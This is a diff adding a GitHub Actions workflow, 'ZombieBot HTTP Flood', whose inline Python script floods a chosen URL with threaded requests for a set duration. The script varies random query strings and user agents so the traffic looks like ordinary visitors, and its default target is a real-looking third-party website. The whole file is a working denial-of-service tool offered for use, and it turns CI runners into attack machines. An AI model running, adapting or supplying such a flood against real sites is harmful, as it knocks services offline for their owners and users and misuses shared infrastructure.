@@ -1,0 +1,57 @@
+name: ZombieBot HTTP Flood
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'Target URL (include http[s]://)'
+        required: true
+        default: 'https://theoxfordengg.org'
+      seconds:
+        description: 'Duration of attack (seconds)'
+        required: true
+        default: '60'
+      threads:
+        description: 'Threads per runner'
+        required: true
+        default: '10'
+
+jobs:
+  httpflood:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Install Python HTTP client
+      run: pip install requests
+
+    - name: Launch HTTP Flood
+      run: |
+        python -c "
+import threading, requests, time, random, string
+target = '${{ github.event.inputs.target }}'
+seconds = int('${{ github.event.inputs.seconds }}')
+threads = int('${{ github.event.inputs.threads }}')
+user_agents = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+  'Mozilla/5.0 (X11; Linux x86_64)',
+]
+def attack():
+    end = time.time() + seconds
+    while time.time() < end:
+        try:
+            s = requests.Session()
+            for _ in range(5):
+                url = target + '?q=' + ''.join(random.choices(string.ascii_letters+string.digits, k=6))
+                headers = {'User-Agent': random.choice(user_agents)}
+                s.get(url, headers=headers, timeout=3)
+        except Exception: pass
+
+threads_arr = []
+for _ in range(threads):
+    t = threading.Thread(target=attack)
+    t.start()
+    threads_arr.append(t)
+for t in threads_arr:
+    t.join()
+print('Flood complete.')
+        "
